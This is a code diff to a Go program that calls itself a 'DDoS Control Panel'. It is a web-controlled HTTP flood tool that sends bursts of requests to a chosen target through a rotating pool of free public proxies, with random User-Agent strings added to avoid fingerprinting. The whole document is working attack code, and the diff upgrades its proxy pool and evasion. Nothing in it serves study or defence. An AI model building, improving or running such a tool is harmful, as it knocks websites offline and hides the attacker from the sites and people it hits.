@@ -1,9 +1,8 @@
 package main
 
 import (
+    "bufio"
     "context"
-    "encoding/base64"
-    "encoding/json"
     "fmt"
     "io"
     "log"
@@ -17,67 +16,44 @@ import (
     "sync"
     "sync/atomic"
     "time"
-
-    // Register all ciphers (these packages exist in the latest commit)
-    _ "github.com/shadowsocks/go-shadowsocks2/aead"
-    ss "github.com/shadowsocks/go-shadowsocks2/core"
-    "github.com/shadowsocks/go-shadowsocks2/socks"
-    _ "github.com/shadowsocks/go-shadowsocks2/stream"
 )
 
 // ========== CONFIG ==========
 const (
-    proxyListURL    = "https://raw.githubusercontent.com/render12345api/svr/main/ss_working.txt"
-    maxProxies      = 8
-    reqsPerBurst    = 100
-    burstInterval   = 10 * time.Millisecond
-    refreshInterval = 15 * time.Minute
-    maxErrorLog     = 20
-    localSocksPort  = 1080
-    healthCheckURL  = "http://connectivitycheck.gstatic.com/generate_204"
+    proxyListURL     = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
+    maxProxies       = 50                     // Maximum concurrent proxies in pool
+    checkerWorkers   = 100                    // Number of concurrent proxy testers
+    checkerTimeout   = 5 * time.Second        // Timeout for testing each proxy
+    healthCheckURL   = "http://connectivitycheck.gstatic.com/generate_204"
+    reqsPerBurst     = 100
+    burstInterval    = 10 * time.Millisecond
+    refreshInterval  = 15 * time.Minute
+    maxErrorLog      = 20
+    proxyTestTimeout = 3 * time.Second        // Timeout for proxy connection test
 )
 
-// cipherNameMap translates common Shadowsocks method names to those expected by go-shadowsocks2.
-var cipherNameMap = map[string]string{
-    "aes-128-cfb":              "AES-128-CFB",
-    "aes-192-cfb":              "AES-192-CFB",
-    "aes-256-cfb":              "AES-256-CFB",
-    "aes-128-ctr":              "AES-128-CTR",
-    "aes-192-ctr":              "AES-192-CTR",
-    "aes-256-ctr":              "AES-256-CTR",
-    "aes-128-gcm":              "AEAD_AES_128_GCM",
-    "aes-192-gcm":              "AEAD_AES_192_GCM",
-    "aes-256-gcm":              "AEAD_AES_256_GCM",
-    "chacha20-ietf-poly1305":   "AEAD_CHACHA20_POLY1305",
-    "chacha20-poly1305":        "AEAD_CHACHA20_POLY1305",
-    "chacha20":                 "CHACHA20",
-    "rc4-md5":                  "RC4-MD5",
-    "salsa20":                  "SALSA20",
-}
-
-// supportedMethods are the keys we accept from the proxy list.
-var supportedMethods = map[string]bool{
-    "aes-128-cfb": true, "aes-192-cfb": true, "aes-256-cfb": true,
-    "aes-128-ctr": true, "aes-192-ctr": true, "aes-256-ctr": true,
-    "aes-128-gcm": true, "aes-192-gcm": true, "aes-256-gcm": true,
-    "chacha20-ietf-poly1305": true, "chacha20-poly1305": true,
-    "rc4-md5": true, "chacha20": true, "salsa20": true,
-}
-
 // ========== STRUCTS ==========
-type ProxyConfig struct {
-    Method   string
-    Password string
-    Server   string
-    Port     string
-}
+type ProxyProtocol int
 
-type ProxyInstance struct {
-    Config   ProxyConfig
-    Client   *http.Client
+const (
+    Unknown ProxyProtocol = iota
+    HTTP
+    SOCKS4
+    SOCKS5
+)
+
+type Proxy struct {
     URL      *url.URL
+    Protocol ProxyProtocol
     Healthy  bool
     failures int
+    mu       sync.RWMutex
+}
+
+type ProxyPool struct {
+    proxies []*Proxy
+    mu      sync.RWMutex
+    next    uint64
 }
 
 type AttackStats struct {
@@ -94,10 +70,7 @@ type ErrorEntry struct {
 
 // ========== GLOBAL STATE ==========
 var (
-    proxyConfigs   []ProxyConfig
-    proxyPool      []*ProxyInstance
-    poolMutex      sync.RWMutex
-    currentIndex   uint64
+    pool           *ProxyPool
     stats          AttackStats
     errorLog       []ErrorEntry
     errorLogMutex  sync.Mutex
@@ -109,279 +82,219 @@ var (
 )
 
 // ========== PROXY PARSING ==========
-func decodeBase64Safe(s string) (string, error) {
-    if l := len(s) % 4; l > 0 {
-        s += strings.Repeat("=", 4-l)
-    }
-    s = strings.ReplaceAll(s, "-", "+")
-    s = strings.ReplaceAll(s, "_", "/")
-    b, err := base64.StdEncoding.DecodeString(s)
-    if err != nil {
-        return "", err
-    }
-    return string(b), nil
-}
-
-func parseSSLine(line string) *ProxyConfig {
+func parseProxyLine(line string) *Proxy {
     line = strings.TrimSpace(line)
-    if !strings.HasPrefix(line, "ss://") {
+    if line == "" {
         return nil
     }
-    if idx := strings.Index(line, "#"); idx != -1 {
-        line = line[:idx]
-    }
-    if decoded, err := url.QueryUnescape(line); err == nil {
-        line = decoded
+
+    // Handle different proxy formats
+    var proxyURL *url.URL
+    var err error
+
+    // If line doesn't have a scheme, try adding http:// as fallback
+    if strings.Contains(line, "://") {
+        proxyURL, err = url.Parse(line)
+    } else {
+        proxyURL, err = url.Parse("http://" + line)
     }
 
-    raw := line[5:]
-
-    // Standard format: ss://base64(method:pass)@server:port
-    if atIdx := strings.Index(raw, "@"); atIdx != -1 {
-        encoded := raw[:atIdx]
-        serverPort := raw[atIdx+1:]
-        decoded, err := decodeBase64Safe(encoded)
-        if err == nil {
-            mp := strings.SplitN(decoded, ":", 2)
-            if len(mp) == 2 {
-                sp := strings.SplitN(serverPort, ":", 2)
-                if len(sp) == 2 {
-                    return &ProxyConfig{
-                        Method:   mp[0],
-                        Password: mp[1],
-                        Server:   sp[0],
-                        Port:     sp[1],
-                    }
-                }
-            }
-        }
-    }
-
-    // Base64 JSON config
-    var b64 string
-    if strings.ContainsAny(raw, "@:") {
-        return nil
-    }
-    b64 = raw
-    if qIdx := strings.Index(b64, "?"); qIdx != -1 {
-        b64 = b64[:qIdx]
-    }
-    decoded, err := decodeBase64Safe(b64)
     if err != nil {
         return nil
     }
-    var j struct {
-        Server string `json:"server"`
-        Add    string `json:"add"`
-        Port   string `json:"port"`
-        Method string `json:"method"`
-        Pass   string `json:"password"`
+
+    // Determine protocol
+    var protocol ProxyProtocol
+    switch proxyURL.Scheme {
+    case "http":
+        protocol = HTTP
+    case "socks4":
+        protocol = SOCKS4
+    case "socks5":
+        protocol = SOCKS5
+    default:
+        // Treat unknown as HTTP proxy
+        protocol = HTTP
+        // Fix the scheme
+        proxyURL.Scheme = "http"
     }
-    if err := json.Unmarshal([]byte(decoded), &j); err != nil {
-        return nil
-    }
-    server := j.Server
-    if server == "" {
-        server = j.Add
-    }
-    if server == "" || j.Port == "" || j.Method == "" || j.Pass == "" {
-        return nil
-    }
-    return &ProxyConfig{
-        Method:   j.Method,
-        Password: j.Pass,
-        Server:   server,
-        Port:     j.Port,
+
+    return &Proxy{
+        URL:      proxyURL,
+        Protocol: protocol,
+        Healthy:  false,
+        failures: 0,
     }
 }
 
-func fetchProxyConfigs() ([]ProxyConfig, error) {
-    log.Println("Fetching proxy list...")
+// ========== PROXY FETCHING ==========
+func fetchProxyList() ([]*Proxy, error) {
+    log.Println("Fetching proxy list from Proxifly...")
     resp, err := http.Get(proxyListURL)
     if err != nil {
         return nil, err
     }
     defer resp.Body.Close()
-    body, err := io.ReadAll(resp.Body)
-    if err != nil {
+
+    var proxies []*Proxy
+    scanner := bufio.NewScanner(resp.Body)
+    for scanner.Scan() {
+        line := scanner.Text()
+        if proxy := parseProxyLine(line); proxy != nil {
+            proxies = append(proxies, proxy)
+        }
+    }
+    if err := scanner.Err(); err != nil {
         return nil, err
     }
-    lines := strings.Split(string(body), "\n")
-    var configs []ProxyConfig
-    for _, line := range lines {
-        cfg := parseSSLine(line)
-        if cfg != nil && supportedMethods[cfg.Method] {
-            configs = append(configs, *cfg)
-            log.Printf("✅ Valid: %s@%s:%s", cfg.Method, cfg.Server, cfg.Port)
-        }
-    }
-    log.Printf("Total valid configs: %d", len(configs))
-    return configs, nil
+    log.Printf("Parsed %d proxies from list", len(proxies))
+    return proxies, nil
 }
 
-// ========== SHADOWSOCKS LOCAL SERVERS ==========
-func startLocalSOCKS5(cfg ProxyConfig, localPort int) (func(), error) {
-    mappedMethod, ok := cipherNameMap[cfg.Method]
-    if !ok {
-        mappedMethod = cfg.Method
-        log.Printf("No mapping for %s, trying original", cfg.Method)
+// ========== PROXY HEALTH CHECKER ==========
+func testProxy(proxy *Proxy) bool {
+    // Create a transport that uses the proxy
+    transport := &http.Transport{
+        Proxy: http.ProxyURL(proxy.URL),
+        DialContext: (&net.Dialer{
+            Timeout:   proxyTestTimeout,
+            KeepAlive: 0,
+        }).DialContext,
+        TLSHandshakeTimeout: proxyTestTimeout,
+        DisableKeepAlives:   true, // Disable keep-alive for testing
     }
 
-    log.Printf("Attempting cipher: %s → %s", cfg.Method, mappedMethod)
+    client := &http.Client{
+        Transport: transport,
+        Timeout:   proxyTestTimeout,
+    }
 
-    cipher, err := ss.PickCipher(mappedMethod, nil, cfg.Password)
+    // Test with Google connectivity check
+    resp, err := client.Get(healthCheckURL)
     if err != nil {
-        return nil, fmt.Errorf("cipher error: %w", err)
+        return false
     }
+    defer resp.Body.Close()
 
-    remoteAddr := net.JoinHostPort(cfg.Server, cfg.Port)
-
-    ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
-    if err != nil {
-        return nil, err
-    }
-
-    go func() {
-        for {
-            conn, err := ln.Accept()
-            if err != nil {
-                return
-            }
-            go handleSOCKS5(conn, remoteAddr, mappedMethod, cipher)
-        }
-    }()
-
-    log.Printf("✅ Local SOCKS5 on 127.0.0.1:%d → %s (%s)", localPort, remoteAddr, cfg.Method)
-    return func() { ln.Close() }, nil
+    // Consume body to reuse connection
+    io.Copy(io.Discard, resp.Body)
+    return resp.StatusCode == 204
 }
 
-func handleSOCKS5(client net.Conn, remoteAddr, method string, cipher ss.Cipher) {
-    defer client.Close()
-    _, err := socks.Handshake(client)
-    if err != nil {
-        return
-    }
-    remote, err := ss.Dial(remoteAddr, method, cipher)
-    if err != nil {
-        return
-    }
-    defer remote.Close()
-    go func() {
-        io.Copy(remote, client)
-        if tcpConn, ok := remote.(*net.TCPConn); ok {
-            tcpConn.CloseWrite()
-        }
-    }()
-    io.Copy(client, remote)
-    if tcpConn, ok := client.(*net.TCPConn); ok {
-        tcpConn.CloseWrite()
-    }
-}
-
-// ========== PROXY POOL ==========
-func buildProxyPool(ctx context.Context, configs []ProxyConfig) error {
-    poolMutex.Lock()
-    defer poolMutex.Unlock()
-
-    for _, p := range proxyPool {
-        if p.Client != nil {
-            p.Client.CloseIdleConnections()
-        }
-    }
-    proxyPool = nil
-
-    var instances []*ProxyInstance
-    var closers []func()
-
-    for i, cfg := range configs {
-        if i >= maxProxies {
-            break
-        }
-        port := localSocksPort + i
-        closer, err := startLocalSOCKS5(cfg, port)
-        if err != nil {
-            log.Printf("Failed to start proxy on port %d: %v", port, err)
-            continue
-        }
-        closers = append(closers, closer)
-
-        proxyURL, _ := url.Parse(fmt.Sprintf("socks5://127.0.0.1:%d", port))
-        client := &http.Client{
-            Transport: &http.Transport{
-                Proxy: http.ProxyURL(proxyURL),
-            },
-            Timeout: 10 * time.Second,
-        }
-
-        instances = append(instances, &ProxyInstance{
-            Config:   cfg,
-            Client:   client,
-            URL:      proxyURL,
-            Healthy:  true,
-            failures: 0,
-        })
-    }
-
-    go func() {
-        ticker := time.NewTicker(30 * time.Second)
-        defer ticker.Stop()
-        for {
-            select {
-            case <-ctx.Done():
-                for _, closer := range closers {
-                    closer()
-                }
-                return
-            case <-ticker.C:
-                checkProxyHealth(ctx, instances)
-            }
-        }
-    }()
-
-    proxyPool = instances
-    log.Printf("Proxy pool built with %d instances", len(proxyPool))
-    return nil
-}
-
-func checkProxyHealth(ctx context.Context, instances []*ProxyInstance) {
-    for _, p := range instances {
-        if !p.Healthy {
-            p.failures++
-            if p.failures > 3 {
-                p.Healthy = false
-            }
-            continue
-        }
-        req, _ := http.NewRequestWithContext(ctx, "GET", healthCheckURL, nil)
-        resp, err := p.Client.Do(req)
-        if err != nil {
-            p.failures++
-            if p.failures > 2 {
-                p.Healthy = false
-                log.Printf("Proxy %s marked unhealthy: %v", p.URL, err)
-            }
-            continue
-        }
-        io.Copy(io.Discard, resp.Body)
-        resp.Body.Close()
+func (p *Proxy) checkHealth() bool {
+    healthy := testProxy(p)
+    p.mu.Lock()
+    defer p.mu.Unlock()
+    p.Healthy = healthy
+    if healthy {
         p.failures = 0
+    } else {
+        p.failures++
+    }
+    return healthy
+}
+
+// ========== PROXY POOL MANAGEMENT ==========
+func NewProxyPool() *ProxyPool {
+    return &ProxyPool{
+        proxies: make([]*Proxy, 0),
+        next:    0,
     }
 }
 
-func getNextProxy() *ProxyInstance {
-    poolMutex.RLock()
-    defer poolMutex.RUnlock()
-    if len(proxyPool) == 0 {
+func (p *ProxyPool) Add(proxy *Proxy) {
+    p.mu.Lock()
+    defer p.mu.Unlock()
+    p.proxies = append(p.proxies, proxy)
+}
+
+func (p *ProxyPool) Size() int {
+    p.mu.RLock()
+    defer p.mu.RUnlock()
+    return len(p.proxies)
+}
+
+func (p *ProxyPool) GetNext() *Proxy {
+    p.mu.RLock()
+    defer p.mu.RUnlock()
+    if len(p.proxies) == 0 {
         return nil
     }
-    idx := atomic.AddUint64(&currentIndex, 1) % uint64(len(proxyPool))
-    return proxyPool[idx]
+    idx := atomic.AddUint64(&p.next, 1) % uint64(len(p.proxies))
+    proxy := p.proxies[idx]
+
+    // Quick check if it's healthy (lock-free read)
+    proxy.mu.RLock()
+    healthy := proxy.Healthy
+    proxy.mu.RUnlock()
+
+    if !healthy {
+        return nil
+    }
+    return proxy
+}
+
+func (p *ProxyPool) RemoveUnhealthy() {
+    p.mu.Lock()
+    defer p.mu.Unlock()
+
+    var healthy []*Proxy
+    for _, proxy := range p.proxies {
+        proxy.mu.RLock()
+        isHealthy := proxy.Healthy
+        failures := proxy.failures
+        proxy.mu.RUnlock()
+
+        // Keep if healthy or failures less than 3
+        if isHealthy || failures < 3 {
+            healthy = append(healthy, proxy)
+        }
+    }
+    p.proxies = healthy
+}
+
+// ========== CONCURRENT PROXY CHECKER ==========
+func checkProxiesConcurrently(proxies []*Proxy) *ProxyPool {
+    log.Printf("Starting concurrent health check with %d workers", checkerWorkers)
+    pool := NewProxyPool()
+    var wg sync.WaitGroup
+    proxyChan := make(chan *Proxy, len(proxies))
+
+    // Start workers
+    for i := 0; i < checkerWorkers; i++ {
+        wg.Add(1)
+        go func() {
+            defer wg.Done()
+            for proxy := range proxyChan {
+                if proxy.checkHealth() {
+                    pool.Add(proxy)
+                    log.Printf("✅ Proxy live: %s", proxy.URL.String())
+                } else {
+                    log.Printf("❌ Proxy dead: %s", proxy.URL.String())
+                }
+            }
+        }()
+    }
+
+    // Feed proxies to workers
+    for _, proxy := range proxies {
+        proxyChan <- proxy
+    }
+    close(proxyChan)
+
+    wg.Wait()
+    log.Printf("Health check complete. Live proxies: %d/%d", pool.Size(), len(proxies))
+    return pool
 }
 
 // ========== ATTACK ENGINE ==========
 func startAttack(target string, duration int) error {
     if attackActive {
         return fmt.Errorf("attack already in progress")
+    }
+
+    if pool.Size() == 0 {
+        return fmt.Errorf("no healthy proxies available")
     }
 
     ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
@@ -413,14 +326,40 @@ func startAttack(target string, duration int) error {
                         if !attackActive {
                             return
                         }
-                        proxy := getNextProxy()
-                        if proxy == nil || !proxy.Healthy {
+                        proxy := pool.GetNext()
+                        if proxy == nil {
                             atomic.AddUint64(&stats.Errors, 1)
                             logError(target, "no healthy proxy", "")
                             return
                         }
+
+                        // Create client with proxy
+                        transport := &http.Transport{
+                            Proxy: http.ProxyURL(proxy.URL),
+                            DialContext: (&net.Dialer{
+                                Timeout:   10 * time.Second,
+                                KeepAlive: 30 * time.Second,
+                            }).DialContext,
+                            TLSHandshakeTimeout:   10 * time.Second,
+                            ResponseHeaderTimeout: 10 * time.Second,
+                            MaxIdleConns:          100,
+                            MaxConnsPerHost:        100,
+                            IdleConnTimeout:        90 * time.Second,
+                        }
+
+                        client := &http.Client{
+                            Transport: transport,
+                            Timeout:   15 * time.Second,
+                        }
+
                         req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
-                        resp, err := proxy.Client.Do(req)
+                        // Add random headers to avoid fingerprinting
+                        req.Header.Set("User-Agent", randomUserAgent())
+                        req.Header.Set("Accept", "*/*")
+                        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+                        req.Header.Set("Cache-Control", "no-cache")
+
+                        resp, err := client.Do(req)
                         if err != nil {
                             atomic.AddUint64(&stats.Errors, 1)
                             logError(target, err.Error(), proxy.URL.String())
@@ -444,6 +383,18 @@ func startAttack(target string, duration int) error {
     }()
 
     return nil
+}
+
+func randomUserAgent() string {
+    agents := []string{
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+    }
+    return agents[time.Now().UnixNano()%int64(len(agents))]
 }
 
 func stopAttack() {
@@ -500,17 +451,15 @@ func main() {
         os.Exit(0)
     }()
 
-    var err error
-    proxyConfigs, err = fetchProxyConfigs()
+    // Initial proxy fetch and check
+    proxies, err := fetchProxyList()
     if err != nil {
-        log.Fatal("Failed to fetch proxies:", err)
+        log.Fatal("Failed to fetch proxy list:", err)
     }
 
-    err = buildProxyPool(ctx, proxyConfigs)
-    if err != nil {
-        log.Fatal("Failed to build proxy pool:", err)
-    }
+    pool = checkProxiesConcurrently(proxies)
 
+    // Background refresh
     go func() {
         ticker := time.NewTicker(refreshInterval)
         defer ticker.Stop()
@@ -520,13 +469,28 @@ func main() {
                 return
             case <-ticker.C:
                 log.Println("Refreshing proxy list...")
-                newConfigs, err := fetchProxyConfigs()
+                newProxies, err := fetchProxyList()
                 if err != nil {
                     log.Println("Refresh failed:", err)
                     continue
                 }
-                proxyConfigs = newConfigs
-                buildProxyPool(ctx, proxyConfigs)
+                newPool := checkProxiesConcurrently(newProxies)
+                pool = newPool
+            }
+        }
+    }()
+
+    // Periodic cleanup of unhealthy proxies
+    go func() {
+        ticker := time.NewTicker(5 * time.Minute)
+        defer ticker.Stop()
+        for {
+            select {
+            case <-ctx.Done():
+                return
+            case <-ticker.C:
+                pool.RemoveUnhealthy()
+                log.Printf("Proxy pool cleanup: %d proxies remain", pool.Size())
             }
         }
     }()
@@ -535,6 +499,7 @@ func main() {
     http.HandleFunc("/start", startHandler)
     http.HandleFunc("/stop", stopHandler)
     http.HandleFunc("/stats", statsHandler)
+    http.HandleFunc("/proxies", proxiesHandler)
 
     port := os.Getenv("PORT")
     if port == "" {
@@ -621,10 +586,18 @@ func statsHandler(w http.ResponseWriter, r *http.Request) {
     }
 }
 
+func proxiesHandler(w http.ResponseWriter, r *http.Request) {
+    w.Header().Set("Content-Type", "application/json")
+    json.NewEncoder(w).Encode(map[string]interface{}{
+        "total":  pool.Size(),
+        "healthy": pool.Size(),
+    })
+}
+
 const htmlTemplate = `<!DOCTYPE html>
 <html>
 <head>
-    <title>DDoS Control Panel (Go)</title>
+    <title>DDoS Control Panel</title>
     <style>
         body { background: white; font-family: Arial, sans-serif; margin: 20px; color: #333; }
         .container { max-width: 1200px; margin: auto; }
@@ -648,7 +621,7 @@ const htmlTemplate = `<!DOCTYPE html>
 </head>
 <body>
     <div class="container">
-        <h1>DDoS Control Panel (Go)</h1>
+        <h1>DDoS Control Panel</h1>
 
         <div class="card">
             <div class="status" id="status">Online</div>
@@ -664,7 +637,7 @@ const htmlTemplate = `<!DOCTYPE html>
                 </div>
                 <div class="stat-box">
                     <div class="stat-value" id="proxyCount">0</div>
-                    <div class="stat-label">Proxies</div>
+                    <div class="stat-label">Live Proxies</div>
                 </div>
             </div>
 
@@ -680,7 +653,7 @@ const htmlTemplate = `<!DOCTYPE html>
             </div>
 
             <div class="footer">
-                Custom proxy pool – refreshed every 15 min
+                Proxies from proxifly/free-proxy-list – refreshed every 15 min
             </div>
         </div>
     </div>
@@ -690,11 +663,16 @@ const htmlTemplate = `<!DOCTYPE html>
 
         async function updateStatus() {
             try {
-                const res = await fetch('/stats');
-                const data = await res.json();
-                document.getElementById('reqCount').innerText = data.requests;
-                document.getElementById('errCount').innerText = data.errors;
-                document.getElementById('proxyCount').innerText = '8';
+                const [statsRes, proxiesRes] = await Promise.all([
+                    fetch('/stats'),
+                    fetch('/proxies')
+                ]);
+                const stats = await statsRes.json();
+                const proxies = await proxiesRes.json();
+                document.getElementById('status').innerText = stats.requests > 0 ? 'Attacking' : 'Online';
+                document.getElementById('reqCount').innerText = stats.requests;
+                document.getElementById('errCount').innerText = stats.errors;
+                document.getElementById('proxyCount').innerText = proxies.healthy;
             } catch (err) {
                 console.error('Stats error:', err);
             }
@@ -717,8 +695,6 @@ const htmlTemplate = `<!DOCTYPE html>
                 if (!res.ok) {
                     const text = await res.text();
                     alert('Error: ' + text);
-                } else {
-                    document.getElementById('status').innerText = 'Attacking';
                 }
             } catch (err) {
                 alert('Network error: ' + err.message);
@@ -727,10 +703,7 @@ const htmlTemplate = `<!DOCTYPE html>
 
         async function stopAttack() {
             try {
-                const res = await fetch('/stop', { method: 'POST' });
-                if (res.ok) {
-                    document.getElementById('status').innerText = 'Online';
-                }
+                await fetch('/stop', { method: 'POST' });
             } catch (err) {
                 alert('Network error: ' + err.message);
             }
